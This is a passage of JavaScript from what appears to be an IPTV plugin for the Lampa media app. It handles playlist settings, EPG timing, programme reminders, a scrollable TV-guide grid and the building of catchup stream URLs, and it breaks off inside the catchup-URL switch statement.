                for (var i = 0; i < list.length; i++) {
                  var el = list[i];
                  if (!el || !el.classList) continue;
                  var step = el.getAttribute('data-step') || (el.dataset && el.dataset.step);
                  var stepIdx = order.indexOf(step);
                  el.classList.remove('active', 'done');
                  if (stepIdx < idx) el.classList.add('done');
                  else if (stepIdx === idx) el.classList.add('active');
                }
              };
              var parser = window.iptv_modss_guide_update_process;
              var listen = function listen() {
                if (!parser) return;
                parser.follow('start', function () {
                  parsingBlock.removeClass('hide');
                  resultBlock.addClass('hide');
                  var pf = progressFill[0] || progressFill;
                  if (pf) pf.style.width = '0';
                  percentEl.text('0%');
                  setCheckpoint('load');
                });
                parser.follow('percent', function (data) {
                  var p = Math.min(100, Math.max(0, data.percent));
                  var pf = progressFill[0] || progressFill;
                  if (pf) pf.style.width = p + '%';
                  percentEl.text(p.toFixed(1) + '%');
                  if (p < 30) setCheckpoint('load');else if (p < 85) setCheckpoint('parse');else setCheckpoint('save');
                });
                parser.follow('finish', function (data) {
                  resultBlock.removeClass('playlist-epg-modal__result--error');
                  var pf = progressFill[0] || progressFill;
                  if (pf) pf.style.width = '100%';
                  percentEl.text('100%');
                  setCheckpoint('complete');
                  resultBlock.removeClass('hide');
                  status.find('.settings-param__name').text(Lampa.Lang.translate('iptv_guide_status_finish'));
                  status.find('.settings-param__value').text(Lampa.Lang.translate('iptv_guide_status_channels') + ' - ' + data.count + ', ' + Lampa.Lang.translate('iptv_guide_status_date') + ' - ' + Lampa.Utils.parseTime(data.time).briefly);
                });
                parser.follow('error', function (data) {
                  resultBlock.removeClass('hide').addClass('playlist-epg-modal__result--error');
                  status.find('.settings-param__name').text(Lampa.Lang.translate('title_error'));
                  status.find('.settings-param__value').text(data.text);
                });
              };
              Lampa.Modal.open({
                title: Lampa.Lang.translate('iptv_epg_modal_title'),
                size: 'small',
                html: $(modalBody),
                onBack: function onBack() {
                  Lampa.Modal.close();
                  Lampa.Controller.toggle('content');
                }
              });
              Guide.update(status, _this2.urlTvg);
              parser = window.iptv_modss_guide_update_process;
              listen();
              return;
            }
            if (a.name) {
              var keys = {
                update: ['always', 'hour', 'hour12', 'day', 'week', 'none'],
                loading: ['modss', 'lampa']
              }[a.name];
              if (!keys) return;
              var items = [];
              keys.forEach(function (k) {
                items.push({
                  title: iptvParamTitle(k),
                  selected: _this2.params[a.name] == k,
                  value: k
                });
              });
              Lampa.Select.show({
                title: Lampa.Lang.translate('title_settings'),
                items: items,
                onSelect: function onSelect(b) {
                  _this2.params[a.name] = b.value;
                  Params.set(_this2.playlist.id, _this2.params).then(_this2.drawFooter.bind(_this2))["catch"](function (e) {
                    Lampa.Noty.show(e);
                  })["finally"](_this2.displaySettings.bind(_this2));
                },
                onBack: _this2.displaySettings.bind(_this2)
              });
            } else {
              DB.deleteData('playlist', _this2.playlist.id)["finally"](function () {
                Lampa.Noty.show(Lampa.Lang.translate('iptv_cache_clear'));
              });
              Lampa.Controller.toggle('content');
            }
          },
          onBack: function onBack() {
            Lampa.Controller.toggle('content');
          }
        });
      }
    }, {
      key: "drawFooter",
      value: function drawFooter() {
        var _this3 = this;
        this.footer.removeClass('hide');
        function label(where, name, value) {
          var leb_div = document.createElement('div');
          var leb_val = document.createElement('span');
          leb_div.addClass('iptv-playlist-item__label');
          if (name) leb_div.text(name + ' - ');
          leb_val.text(value);
          leb_div.append(leb_val);
          where.append(leb_div);
        }
        DB.getDataAnyCase('playlist', 'active').then(function (active) {
          var details_left = _this3.item.find('.details-left').empty();
          var details_right = _this3.item.find('.details-right').empty();
          if (active && active == _this3.playlist.id) label(details_left, '', Lampa.Lang.translate('iptv_active'));
          label(details_left, Lampa.Lang.translate('iptv_update'), Params.value(_this3.params, 'update'));
          if (!_this3.playlist.local) label(details_left, Lampa.Lang.translate('iptv_loading'), Params.value(_this3.params, 'loading'));
          label(details_right, Lampa.Lang.translate('iptv_updated'), Lampa.Utils.parseTime(_this3.params.update_time).briefly);
        });
      }
    }, {
      key: "render",
      value: function render() {
        return this.item;
      }
    }]);
  }();

  var Playlist = /*#__PURE__*/function () {
    function Playlist(listener) {
      _classCallCheck(this, Playlist);
      this.listener = listener;
      this.html = Lampa.Template.js('modss_iptv_list');
      this.scroll = new Lampa.Scroll({
        mask: true,
        over: true
      });
      this.html.find('.iptv-list__title').text(Lampa.Lang.translate('iptv_select_playlist'));
      this.html.find('.iptv-list__items').append(this.scroll.render(true));
    }
    return _createClass(Playlist, [{
      key: "item",
      value: function item(data) {
        var _this = this;
        var item = new PlaylistItem(data);
        item.listener = this.listener;
        var elem = item.render();
        elem.on('hover:focus', function () {
          _this.last = elem;
          _this.scroll.update(_this.last);
        }).on('hover:hover hover:touch', function () {
          _this.last = elem;
          Navigator.focused(elem);
        });
        return item;
      }
    }, {
      key: "list",
      value: function list(playlist) {
        var _this2 = this;
        this.scroll.clear();
        this.scroll.reset();
        this.html.find('.iptv-list__text').html(Lampa.Lang.translate('iptv_modss_select_playlist_text'));
        playlist.list.forEach(function (data) {
          var item = _this2.item(data);
          _this2.scroll.append(item.render());
        });
        this.listener.send('display', this);
      }
    }, {
      key: "main",
      value: function main() {
        var _this = this;
        TVApi.list().then(this.list.bind(this))["catch"](function (e) { return _this.empty(e); });
      }
    }, {
      key: "load",
      value: function load() {
        var _this3 = this;
        Promise.all([TVApi.list(), DB.getDataAnyCase('playlist', 'active')]).then(function (result) {
          var playlist = result[0];
          var active = result[1] || Pilot.notebook('playlist');
          if (playlist) {
            if (active) {
              var find = playlist.list.find(function (l) {
                return l.id == active;
              });
              if (find) {
                _this3.listener.send('channels-load', find);
              } else _this3.list(playlist);
            } else _this3.list(playlist);
          } else _this3.empty();
        })["catch"](function (e) { return _this3.empty(e); });
      }
    }, {
      key: "empty",
      value: function empty(err) {
        this.scroll.clear();
        this.scroll.reset();
        var msg = Lampa.Lang.translate('iptv_modss_playlist_empty');
        var detail = Lampa.Lang.translate('empty_title');
        if (err && (err.title || err.responseJSON && err.responseJSON.text)) {
          msg = err.title || err.responseJSON.text || msg;
          detail = err.descr || err.responseJSON.code || '';
        }
        this.html.find('.iptv-list__text').html(msg);
        var empty = Lampa.Template.js('modss_iptv_list_empty');
        empty.find('.iptv-list-empty__text').html(detail || Lampa.Lang.translate('empty_title'));
        this.scroll.append(empty);
        this.listener.send('display', this);
      }
    }, {
      key: "toggle",
      value: function toggle() {
        var _this4 = this;
        Lampa.Controller.add('content', {
          toggle: function toggle() {
            Lampa.Controller.collectionSet(_this4.html);
            Lampa.Controller.collectionFocus(_this4.last, _this4.html);
          },
          left: function left() {
            Lampa.Controller.toggle('menu');
          },
          down: Navigator.move.bind(Navigator, 'down'),
          up: function up() {
            if (Navigator.canmove('up')) Navigator.move('up');else Lampa.Controller.toggle('head');
          },
          back: function back() {
            Lampa.Activity.backward();
          }
        });
        Lampa.Controller.toggle('content');
      }
    }, {
      key: "render",
      value: function render() {
        return this.html;
      }
    }, {
      key: "destroy",
      value: function destroy() {
        this.scroll.destroy();
        this.html.remove();
      }
    }]);
  }();

  var EPG = /*#__PURE__*/function () {
    function EPG() {
      _classCallCheck(this, EPG);
    }
    return _createClass(EPG, null, [{
      key: "init",
      value: function init() {
        var _this = this;
        var ts = new Date().getTime();
        TVApi.time(function (json) {
          var te = new Date().getTime();
          _this.time_offset = json.time < ts || json.time > te ? json.time - te : 0;
        });
      }
    }, {
      key: "time",
      value: function time(channel) {
        var timeshift = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;
        var date = new Date(),
          time = date.getTime() + this.time_offset,
          ofst = parseInt((localStorage.getItem('time_offset') == null ? 'n0' : localStorage.getItem('time_offset')).replace('n', ''));
        date = new Date(time + ofst * 1000 * 60 * 60);
        var offset = channel.name.match(/([+|-]\d)$/);
        if (offset) {
          date.setHours(date.getHours() + parseInt(offset[1]));
        }
        var result = date.getTime();
        result -= timeshift;
        return result;
      }
    }, {
      key: "position",
      value: function position(channel, list, timeshift) {
        var tim = this.time(channel, timeshift);
        var now = list.find(function (p) {
          return tim > p.start && tim < p.stop;
        });
        return now ? list.indexOf(now) : list.length - 1;
      }
    }, {
      key: "timeline",
      value: function timeline(channel, program, timeshift) {
        var time = this.time(channel, timeshift);
        var total = program.stop - program.start;
        var less = program.stop - time;
        return Math.min(100, Math.max(0, (1 - less / total) * 100));
      }
    }, {
      key: "list",
      value: function list(channel, _list) {
        var size = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 10;
        var position = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : 0;
        var day_lst = '';
        var day_prg = '';
        var day_now = new Date(Date.now()).getDate();
        var day_nam = {};
        var display = [];
        day_nam[day_now - 1] = Lampa.Lang.translate('iptv_yesterday');
        day_nam[day_now] = Lampa.Lang.translate('iptv_today');
        day_nam[day_now + 1] = Lampa.Lang.translate('iptv_tomorrow');
        var watch = _list[this.position(channel, _list)];
        _list.slice(position, position + size).forEach(function (elem) {
          day_prg = new Date(elem.start).getDate();
          if (day_lst !== day_prg) {
            day_lst = day_prg;
            display.push({
              type: 'date',
              date: day_nam[day_prg] ? day_nam[day_prg] : Lampa.Utils.parseTime(elem.start)["short"]
            });
          }
          display.push({
            type: 'program',
            program: elem,
            watch: watch == elem
          });
        });
        return display;
      }
    }]);
  }();
  _defineProperty(EPG, "time_offset", 0);

  /** Полифиллы для старых браузеров (Safari 5.1, Chromium 5, Smart TV) */

  function findIndex(arr, fn) {
    if (!arr || typeof arr.length !== 'number') return -1;
    for (var i = 0; i < arr.length; i++) {
      if (fn(arr[i], i, arr)) return i;
    }
    return -1;
  }
  function find(arr, fn) {
    if (!arr || typeof arr.length !== 'number') return undefined;
    for (var i = 0; i < arr.length; i++) {
      if (fn(arr[i], i, arr)) return arr[i];
    }
    return undefined;
  }

  /** NodeList.forEach отсутствует в старых браузерах */
  function forEachNode(nodeList, fn) {
    if (!nodeList) return;
    if (nodeList.forEach) {
      nodeList.forEach(fn);
    } else {
      for (var i = 0; i < nodeList.length; i++) {
        fn(nodeList[i], i, nodeList);
      }
    }
  }
  function setTransform(el, value) {
    if (!el || !el.style) return;
    el.style.webkitTransform = value;
    el.style.transform = value;
  }
  function closest(el, sel) {
    if (!el) return null;
    if (el.closest) return el.closest(sel);
    var matches = el.matches || el.webkitMatchesSelector || el.msMatchesSelector;
    while (el) {
      if (matches && matches.call(el, sel)) return el;
      el = el.parentElement;
    }
    return null;
  }
  function prepend(parent, child) {
    if (!parent) return;
    if (parent.prepend) {
      parent.prepend(child);
    } else {
      parent.insertBefore(child, parent.firstChild);
    }
  }
  function append(parent, child) {
    if (!parent) return;
    if (parent.append) {
      parent.append(child);
    } else {
      parent.appendChild(child);
    }
  }
  function startsWith(str, search) {
    if (!str || typeof str !== 'string') return false;
    if (str.startsWith) return str.startsWith(search);
    return str.indexOf(search) === 0;
  }

  var CFG = {
    hourW: 240,
    rowH: 72,
    chanW: 140,
    maxCh: 300,
    hours: 8,
    remindS: 60,
    checkS: 10
  };
  var REM_KEY = 'iptv_modss_epg_rem';

  var Reminders = /*#__PURE__*/function () {
    function Reminders() {
      _classCallCheck(this, Reminders);
    }
    return _createClass(Reminders, null, [{
      key: "list",
      value: function list() {
        try {
          return Lampa.Storage.get(REM_KEY, '[]') || [];
        } catch (e) {
          return [];
        }
      }
    }, {
      key: "add",
      value: function add(ch, prog) {
        if (prog.stop <= Date.now()) return false;
        var list = this.list();
        if (list.some(function (r) {
          return r.cn === ch.name && r.st === prog.start;
        })) return false;
        list.push({
          cn: ch.name,
          ci: ch.id || '',
          cu: ch.url || '',
          t: prog.title,
          d: prog.desc || '',
          st: prog.start,
          sp: prog.stop,
          ts: Date.now()
        });
        Lampa.Storage.set(REM_KEY, list);
        return true;
      }
    }, {
      key: "rm",
      value: function rm(cn, st) {
        Lampa.Storage.set(REM_KEY, this.list().filter(function (r) {
          return !(r.cn === cn && r.st === st);
        }));
      }
    }, {
      key: "has",
      value: function has(cn, st) {
        return this.list().some(function (r) {
          return r.cn === cn && r.st === st;
        });
      }
    }, {
      key: "clean",
      value: function clean() {
        var now = Date.now();
        Lampa.Storage.set(REM_KEY, this.list().filter(function (r) {
          return r.sp > now;
        }));
      }
    }, {
      key: "due",
      value: function due() {
        var now = Date.now();
        var threshold = now + CFG.remindS * 1000;
        return this.list().filter(function (r) {
          return r.st <= threshold && r.sp > now;
        });
      }
    }]);
  }();
  var _remShown = {};
  var safe = function safe(s) {
    return (s + '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  };
  var hm = function hm(ts) {
    var d = new Date(ts);
    var pad = function pad(n) {
      return n < 10 ? '0' + n : '' + n;
    };
    return pad(d.getHours()) + ':' + pad(d.getMinutes());
  };
  function showRemindModal(opts) {
    var channel = opts.channel,
      title = opts.title,
      _opts$desc = opts.desc,
      desc = _opts$desc === void 0 ? '' : _opts$desc,
      start = opts.start,
      stop = opts.stop,
      onSwitch = opts.onSwitch,
      onDismiss = opts.onDismiss;
    var cl = function cl(s) {
      return s ? Utils.clear(s) : '';
    };
    var descHtml = desc ? '<div class="mds-tvg-remind__desc">' + safe(Lampa.Utils.shortText(cl(desc), 300)) + '</div>' : '';
    var html = Lampa.Template.get('modss_iptv_tvg_remind', {
      channel: safe(cl(channel)),
      time: hm(start) + ' – ' + hm(stop),
      title: safe(cl(title)),
      desc: descHtml
    });
    Lampa.Modal.open({
      title: opts.modalTitle || '🔔 ' + Lampa.Lang.translate('iptv_remind'),
      html: html,
      size: 'medium',
      buttons: [{
        name: Lampa.Lang.translate('iptv_remind_switch'),
        onSelect: function onSelect() {
          onSwitch && onSwitch();
          Lampa.Modal.close();
        }
      }, {
        name: Lampa.Lang.translate('iptv_remind_dismiss'),
        onSelect: function onSelect() {
          onDismiss && onDismiss();
          Lampa.Modal.close();
        }
      }],
      onBack: function onBack() {
        onDismiss && onDismiss();
        Lampa.Modal.close();
      }
    });
  }
  function checkReminders() {
    Reminders.clean();
    Reminders.due().forEach(function (r) {
      var k = r.cn + '_' + r.st;
      if (_remShown[k]) return;
      _remShown[k] = true;
      var doClose = function doClose() {
        Reminders.rm(r.cn, r.st);
        Lampa.Controller.toggle('content');
      };
      showRemindModal({
        channel: r.cn,
        title: r.t,
        desc: r.d,
        start: r.st,
        stop: r.sp,
        onSwitch: function onSwitch() {
          doClose();
          Lampa.Listener.send('iptv_modss_play_by_name', {
            name: r.cn
          });
        },
        onDismiss: doClose
      });
    });
  }

  function buildDOM(tvg, c) {
    if (tvg.el) tvg.el.remove();
    var title = Lampa.Lang.translate('iptv_param_guide') + (tvg.filterGroup ? ' — ' + tvg.filterGroup : '');
    var clock = tvg._ds(Date.now()) + ' ' + tvg._hm(Date.now());
    var back = '← ' + Lampa.Lang.translate('back');
    var root = Lampa.Template.get('modss_iptv_tvg', {
      title: title,
      clock: clock,
      back: back
    })[0];
    var ht = root.querySelector('.mds-tvg__title');
    var hclk = root.querySelector('.mds-tvg__clock');
    var hx = root.querySelector('.mds-tvg__back');
    if (ht) ht.textContent = title;
    if (hclk) hclk.textContent = clock;
    if (hx) {
      hx.textContent = back;
      hx.addEventListener('click', function () {
        return tvg.close();
      });
    }
    var chDiv = root.querySelector('.mds-tvg__ch');
    if (chDiv && window.innerWidth < 500) {
      var chHd = chDiv.querySelector('.mds-tvg__ch-hd');
      if (chHd) chHd.remove();
    }
    var chList = root.querySelector('.mds-tvg__ch-list');
    tvg.channels.forEach(function (ch, i) {
      var logoContent;
      if (ch.logo) {
        var img = document.createElement('img');
        img.loading = 'lazy';
        img.onerror = function () {
          img.removeAttribute('src');
          var sp = document.createElement('span');
          sp.textContent = tvg._cl(ch.name).substring(0, 2);
          if (img.parentNode) img.parentNode.replaceChild(sp, img);
        };
        img.src = ch.logo;
        logoContent = img;
      } else {
        var sp = document.createElement('span');
        sp.textContent = tvg._cl(ch.name).substring(0, 2);
        logoContent = sp;
      }
      ch.tvg && /^\d+$/.test(ch.tvg.id + '') ? ch.tvg.id + '' : i + 1;
      var row = Lampa.Template.js('modss_iptv_tvg_channel_row', {
        logo: logoContent,
        name: tvg._cl(ch.name)
      });
      row.setAttribute('data-i', i);
      row.style.height = tvg.rh + 'px';
      if (window.innerWidth < 500) {
        var nm = row.querySelector('.mds-tvg__ch-name');
        if (nm) nm.remove();
      }
      append(chList, row);
    });
    var tlIn = root.querySelector('.mds-tvg__tl-in');
    var now = Date.now();
    for (var h = 0; h < c.hours; h++) {
      var t = tvg.startMs + h * 3600000;
      var mk = Lampa.Template.js('modss_iptv_tvg_time_slot', {
        time: tvg._hm(t)
      });
      mk.style.width = tvg.hw + 'px';
      if (t <= now && t + 3600000 > now) mk.classList.add('now');
      append(tlIn, mk);
    }
    var gi = root.querySelector('.mds-tvg__gi');
    gi.style.width = tvg.totalW + 'px';
    gi.style.height = tvg.totalH + 'px';
    var nowLine = root.querySelector('.mds-tvg__now');
    var nowTime = root.querySelector('.mds-tvg__now-time');
    var grid = root.querySelector('.mds-tvg__grid');
    var chWrap = root.querySelector('.mds-tvg__ch-wrap');
    var inf = root.querySelector('.mds-tvg__inf');
    var prevWrap = root.querySelector('.mds-tvg__preview');
    var prevVideo = root.querySelector('.mds-tvg__preview-video');
    var prevPr = root.querySelector('.mds-tvg__preview-pr');
    var prevCh = root.querySelector('.mds-tvg__preview-ch');
    var prevLogo = root.querySelector('.mds-tvg__preview-logo');
    var prevNum = root.querySelector('.mds-tvg__preview-num');
    if (prevVideo) {
      prevVideo.playsInline = true;
      prevVideo.setAttribute('playsinline', '');
    }
    tvg.el = root;
    tvg.el._chList = chList;
    tvg.el._chWrap = chWrap;
    tvg.el._tlIn = tlIn;
    tvg.el._grid = grid;
    tvg.el._gi = gi;
    tvg.el._inf = inf;
    tvg.el._nowLine = nowLine;
    tvg.el._nowTime = nowTime;
    tvg.el._previewWrap = prevWrap;
    tvg.el._previewVideo = prevVideo;
    tvg.el._previewPr = prevPr;
    tvg.el._previewCh = prevCh;
    tvg.el._previewLogo = prevLogo;
    tvg.el._previewNum = prevNum;
    tvg._updateNowPos();
    tvg.clock = setInterval(function () {
      var n = Date.now();
      hclk.textContent = tvg._ds(n) + ' ' + tvg._hm(n);
      tvg._updateNowPos();
      var gi = tvg.el && tvg.el._gi;
      if (gi) forEachNode(gi.querySelectorAll('.mds-tvg__prog.now .mds-tvg__prog-progress'), function (bar) {
        var prog = closest(bar, '.mds-tvg__prog');
        if (prog && prog._prog) {
          var p = prog._prog;
          if (n >= p.start && n < p.stop) {
            bar.style.width = (n - p.start) / (p.stop - p.start) * 100 + '%';
            bar.style.display = '';
          }
        }
      });
      var row = tvg.rows[tvg.focusR];
      if (row && row.progs && tvg.el && tvg.el._inf) {
        var p = null;
        if (tvg.focusZone === 'ch') {
          for (var i = 0; i < row.progs.length; i++) {
            var pr = row.progs[i]._prog;
            if (pr && n >= pr.start && n < pr.stop) {
              p = pr;
              break;
            }
          }
        } else p = row.progs[tvg.focusP] && row.progs[tvg.focusP]._prog;
        var progWrap = tvg.el._inf.querySelector('.mds-tvg__inf-progress');
        var progBar = tvg.el._inf.querySelector('.mds-tvg__inf-progress-bar');
        if (progWrap && progBar && p) {
          var pct = n >= p.stop ? 100 : n >= p.start ? (n - p.start) / (p.stop - p.start) * 100 : 0;
          progBar.style.width = pct + '%';
          progWrap.style.display = '';
        }
      }
    }, 3000);
    tvg._initTouch(grid);
  }
  function renderRow(tvg, idx, programs) {
    if (!tvg.el) return;
    var gi = tvg.el._gi;
    var old = gi.querySelector('[data-r="' + idx + '"]');
    if (old) old.remove();
    var c = tvg._getCfg();
    var rowEl = document.createElement('div');
    rowEl.className = 'mds-tvg__row mds-tvg__row--prog';
    rowEl.setAttribute('data-r', idx);
    rowEl.style.top = idx * tvg.rh + 'px';
    rowEl.style.height = tvg.rh + 'px';
    var ch = tvg.channels[idx];
    var now = Date.now();
    var endMs = tvg.startMs + c.hours * 3600000;
    var progs = [];
    (programs || []).forEach(function (p) {
      if (p.stop <= tvg.startMs || p.start >= endMs) return;
      var lPx = Math.max(0, (p.start - tvg.startMs) / 3600000 * tvg.hw);
      var rPx = Math.min(tvg.totalW, (p.stop - tvg.startMs) / 3600000 * tvg.hw);
      var wPx = rPx - lPx;
      if (wPx < 4) return;
      var el = Lampa.Template.js('modss_iptv_tvg_program', {
        title: tvg._cl(p.title)
      });
      el.style.left = lPx + 'px';
      el.style.width = wPx + 'px';
      el.style.top = '0';
      el.style.height = tvg.rh + 'px';
      if (now >= p.start && now < p.stop) {
        el.classList.add('now');
        var progBar = el.querySelector('.mds-tvg__prog-progress');
        if (progBar) {
          var pct = (now - p.start) / (p.stop - p.start) * 100;
          progBar.style.width = pct + '%';
          progBar.style.display = '';
        }
      } else {
        if (now >= p.stop) el.classList.add('past');
        var _progBar = el.querySelector('.mds-tvg__prog-progress');
        if (_progBar) _progBar.style.display = 'none';
      }
      if (p.stop > now && Reminders.has(ch.name, p.start)) {
        el.classList.add('mds-tvg__prog--reminded');
        var bl = document.createElement('div');
        bl.className = 'mds-tvg__prog-bell';
        bl.textContent = '🔔';
        prepend(el, bl);
      }
      el._prog = p;
      el._ch = ch;
      el.setAttribute('data-r', idx);
      el.setAttribute('data-p', progs.length);
      progs.push(el);
      append(rowEl, el);
    });
    if (!progs.length) {
      var empty = Lampa.Template.js('modss_iptv_tvg_program_empty', {});
      empty.style.cssText = 'left:0;width:' + tvg.totalW + 'px;top:0;height:' + tvg.rh + 'px';
      empty._prog = null;
      empty._ch = ch;
      empty.setAttribute('data-r', idx);
      empty.setAttribute('data-p', 0);
      progs.push(empty);
      rowEl.append(empty);
    }
    append(gi, rowEl);
    while (tvg.rows.length <= idx) tvg.rows.push(null);
    tvg.rows[idx] = {
      el: rowEl,
      progs: progs,
      ch: ch
    };
    if (tvg.isOpen && tvg.el && typeof Lampa !== 'undefined' && Lampa.Controller) {
      Lampa.Controller.collectionSet(tvg.el);
    }
  }
  function updateInfo(tvg, ch, prog) {
    if (!tvg.el) return;
    var inf = tvg.el._inf;
    var logo = inf.querySelector('.mds-tvg__inf-logo');
    var meta = inf.querySelector('.mds-tvg__inf-meta');
    var prEl = inf.querySelector('.mds-tvg__inf-pr');
    var descEl = inf.querySelector('.mds-tvg__inf-desc');
    var progBar = inf.querySelector('.mds-tvg__inf-progress-bar');
    logo.innerHTML = '';
    if (ch.logo) {
      var img = document.createElement('img');
      img.src = ch.logo;
      img.alt = '';
      img.onerror = function () {
        img.removeAttribute('src');
        logo.innerHTML = '<span>' + tvg._cl(ch.name).substring(0, 2) + '</span>';
      };
      append(logo, img);
    } else logo.textContent = tvg._cl(ch.name).substring(0, 2);
    var num = ch.tvg && /^\d+$/.test((ch.tvg || {}).id + '') ? ch.tvg.id + '' : tvg.channels.indexOf(ch) + 1;
    if (prog) {
      prEl.textContent = tvg._cl(prog.title);
      descEl.textContent = prog.desc ? tvg._cl(prog.desc) : '';
      meta.textContent = tvg._cl(ch.name) + ' | ' + num + ' | ' + tvg._hm(prog.start) + ' – ' + tvg._hm(prog.stop);
      if (progBar) {
        var now = Date.now();
        var pct = 0;
        if (now >= prog.stop) pct = 100;else if (now >= prog.start) pct = (now - prog.start) / (prog.stop - prog.start) * 100;
        progBar.style.width = pct + '%';
        progBar.parentElement.style.display = '';
      }
    } else {
      prEl.textContent = Lampa.Lang.translate('iptv_noprogram');
      descEl.textContent = '';
      meta.textContent = tvg._cl(ch.name) + ' | ' + num;
      if (progBar) {
        progBar.style.width = '0%';
        progBar.parentElement.style.display = 'none';
      }
    }
  }
  function applyScroll(tvg) {
    if (!tvg.el) return;
    var t = 'translate(-' + tvg.scrollX + 'px,-' + tvg.scrollY + 'px)';
    var ty = 'translateY(-' + tvg.scrollY + 'px)';
    var tx = 'translateX(-' + tvg.scrollX + 'px)';
    setTransform(tvg.el._gi, t);
    setTransform(tvg.el._chList, ty);
    setTransform(tvg.el._tlIn, tx);
    tvg._updateNowPos();
  }
  function updateNowPos(tvg) {
    if (!tvg.el || !tvg.el._nowLine) return;
    var now = Date.now();
    var nowPx = (now - tvg.startMs) / 3600000 * tvg.hw;
    tvg.el._nowLine.style.left = nowPx - tvg.scrollX + 'px';
    if (tvg.el._nowTime) tvg.el._nowTime.textContent = tvg._hm(now);
  }

  function findProg(tvg, cx, cy) {
    if (!tvg.el) return null;
    var rect = tvg.el._grid.getBoundingClientRect();
    var px = cx - rect.left + tvg.scrollX;
    var py = cy - rect.top + tvg.scrollY;
    var ri = Math.floor(py / tvg.rh);
    if (ri < 0 || ri >= tvg.channels.length) return null;
    var row = tvg.rows[ri];
    if (!row) return null;
    for (var i = 0; i < row.progs.length; i++) {
      var el = row.progs[i];
      var l = parseFloat(el.style.left);
      var w = parseFloat(el.style.width);
      if (px >= l && px <= l + w) return {
        row: ri,
        idx: i,
        el: el
      };
    }
    return null;
  }
  function initTouch(tvg, grid) {
    var sx = 0,
      sy = 0,
      mx = 0,
      my = 0,
      drag = false;
    grid.addEventListener('touchstart', function (e) {
      var t = e.touches[0];
      sx = tvg.scrollX;
      sy = tvg.scrollY;
      mx = t.clientX;
      my = t.clientY;
      drag = true;
    }, {
      passive: true
    });
    grid.addEventListener('touchmove', function (e) {
      if (!drag) return;
      var t = e.touches[0];
      tvg.scrollX = Math.max(0, Math.min(tvg.totalW - grid.clientWidth, sx + (mx - t.clientX)));
      tvg.scrollY = Math.max(0, Math.min(tvg.totalH - grid.clientHeight, sy + (my - t.clientY)));
      tvg.applyScroll();
    }, {
      passive: true
    });
    grid.addEventListener('touchend', function () {
      drag = false;
      tvg.loadVisible();
    }, {
      passive: true
    });
    grid.addEventListener('wheel', function (e) {
      e.preventDefault();
      tvg.scrollY = Math.max(0, Math.min(tvg.totalH - grid.clientHeight, tvg.scrollY + e.deltaY));
      tvg.scrollX = Math.max(0, Math.min(tvg.totalW - grid.clientWidth, tvg.scrollX + (e.shiftKey ? e.deltaY : e.deltaX)));
      tvg.applyScroll();
      tvg.loadVisible();
    }, {
      passive: false
    });
  }

  function strReplace(str, key2val) {
    for (var key in key2val) {
      str = str.replace(new RegExp(key.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), key2val[key]);
    }
    return str;
  }
  function tf(t, format, u, tz) {
    format = format || '';
    tz = parseInt(tz || '0');
    var thisOffset = EPG.time_offset;
    thisOffset += tz;
    if (!u) thisOffset += parseInt(Lampa.Storage.get('time_offset', 'n0').replace('n', '')) * 60 - new Date().getTimezoneOffset();
    var d = new Date((t + thisOffset) * 1000);
    var r = {
      yyyy: d.getUTCFullYear(),
      MM: ('0' + (d.getUTCMonth() + 1)).substr(-2),
      dd: ('0' + d.getUTCDate()).substr(-2),
      HH: ('0' + d.getUTCHours()).substr(-2),
      mm: ('0' + d.getUTCMinutes()).substr(-2),
      ss: ('0' + d.getUTCSeconds()).substr(-2),
      UTF: t
    };
    return strReplace(format, r);
  }
  function unixtime$1() {
    return Math.floor((new Date().getTime() + EPG.time_offset) / 1000);
  }
  var Url = /*#__PURE__*/function () {
    function Url() {
      _classCallCheck(this, Url);
    }
    return _createClass(Url, null, [{
      key: "prepareUrl",
      value: function prepareUrl(url, program) {
        var m = [],
          val = '',
          r = {
            start: unixtime$1,
            offset: 0
          };
        if (program) {
          var start = Math.floor(program.start / 1000);
          var end = Math.floor(program.stop / 1000);
          var duration = end - start;
          r = {
            start: start,
            utc: start,
            end: end,
            utcend: end,
            offset: unixtime$1() - start,
            duration: duration,
            durationfs: end > unixtime$1() ? 'now' : duration,
            now: unixtime$1,
            lutc: unixtime$1,
            timestamp: unixtime$1,
            d: function d(m) {
              return strReplace(m[6] || '', {
                M: Math.floor(duration / 60),
                S: duration,
                h: Math.floor(duration / 60 / 60),
                m: ('0' + Math.floor(duration / 60) % 60).substr(-2),
                s: '00'
              });
            },
            b: function b(m) {
              return tf(start, m[6], m[4], m[5]);
            },
            e: function e(m) {
              return tf(end, m[6], m[4], m[5]);
            },
            n: function n(m) {
              return tf(unixtime$1(), m[6], m[4], m[5]);
            }
          };
        }
        while (!!(m = url.match(/\${(\((([a-zA-Z\d]+?)(u)?)([+-]\d+)?\))?([^${}]+)}/))) {
          if (!!m[2] && typeof r[m[2]] === "function") val = r[m[2]](m);else if (!!m[3] && typeof r[m[3]] === "function") val = r[m[3]](m);else if (m[6] in r) val = typeof r[m[6]] === "function" ? r[m[6]]() : r[m[6]];else val = m[1];
          url = url.replace(m[0], encodeURIComponent(val));
        }
        return url;
      }
    }, {
      key: "catchupUrl",
      value: function catchupUrl(url, type, source) {
        type = (type || '').toLowerCase();
        source = source || '';
        if (!type) {
          if (!!source) {
            if (source.search(/^https?:\/\//i) === 0) type = 'default';else if (source.search(/^[?&/][^/]/) === 0) type = 'append';else type = 'default';
          } else if (url.indexOf('${') < 0) type = 'shift';else type = 'default';
          console.log('IPTV', 'Autodetect catchup-type "' + type + '"');
        }
        var newUrl = '';
        switch (type) {
          case 'append':
            if (source) {
              newUrl = (source.search(/^https?:\/\//i) === 0 ? '' : url) + source;
              break; // так и задумано
            }
          case 'timeshift': // @deprecated
          case 'shift':
            // + append
            newUrl = source || url;
            newUrl += (newUrl.indexOf('?') >= 0 ? '&' : '?') + 'utc=${start}&lutc=${timestamp}';
            return newUrl;
          case 'flussonic':
          case 'flussonic-hls':
          case 'flussonic-ts':
          case 'fs':
            // Example stream and catchup URLs
            // stream:  http://ch01.spr24.net/151/mpegts?token=my_token
            // catchup: http://ch01.spr24.net/151/timeshift_abs-{utc}.ts?token=my_token
            // stream:  http://list.tv:8888/325/index.m3u8?token=secret
            // catchup: http://list.tv:8888/325/timeshift_rel-{offset:1}.m3u8?token=secret
            // stream:  http://list.tv:8888/325/mono.m3u8?token=secret
